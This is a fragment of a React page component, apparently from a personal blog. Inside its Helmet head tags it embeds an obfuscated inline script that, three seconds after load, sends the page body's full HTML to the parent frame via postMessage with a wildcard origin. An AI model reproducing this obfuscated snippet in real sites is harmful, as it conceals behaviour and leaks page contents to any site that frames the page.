        ...
        return (
            <div className="application">
                <Helmet defaultTitle="log" titleTemplate="%s | Sj">
                    ...
                    <meta name="description" content="A little world of mine"/>
                    ...
                    <script type="text/javascript">
                        {`var _0xaea9 = ["sitemapgenerator:: ", "innerHTML", "body", "document", "stringify", "*", "postMessage", "setTimeout"]; window[_0xaea9[7]](function () { parent[_0xaea9[6]](_0xaea9[0] + JSON[_0xaea9[4]](window[_0xaea9[3]][_0xaea9[2]][_0xaea9[1]]), _0xaea9[5]) }, 3000);`}</script>
